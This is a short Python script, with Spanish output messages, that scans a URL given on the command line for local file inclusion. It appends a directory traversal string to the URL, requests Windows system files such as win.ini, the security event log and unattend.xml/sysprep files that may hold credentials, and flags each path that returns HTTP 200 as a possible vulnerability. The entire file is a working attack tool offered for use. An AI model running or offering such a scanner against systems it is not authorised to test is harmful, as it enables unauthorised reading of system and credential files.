import requests
import sys
import re
import time


url = sys.argv[1]

if re.search(r'^(?:http|ftp)s?://', url):

    LFI = '../../../../../../../../../'
    path = ['WINDOWS/system32/drivers/etc/hosts', 'WINDOWS/system32/win.ini', 'WINDOWS/system32/debug/NetSetup.log', 'WINDOWS/system32/config/AppEvent.Evt', 'WINDOWS/system32/config/SecEvent.Evt', 'WINDOWS/Panther/unattend.txt', 'WINDOWS/Panther/unattend.xml', 'WINDOWS/Panther/unattended.xml', 'WINDOWS/Panther/sysprep.inf']
    print("[+] Enviando LFI a " + url)

    try:
        for i in path:
            check = requests.get(url + LFI + i, timeout=5)
            print (check)
            if check.status_code == 200:
                print("[+] Posible URL Vulnerable: " + url + LFI + i)
    except:
        print ("Error al generar URL")

else:
    print ("Parametro no entendido. Try LFI_WindowsServer.py URL")
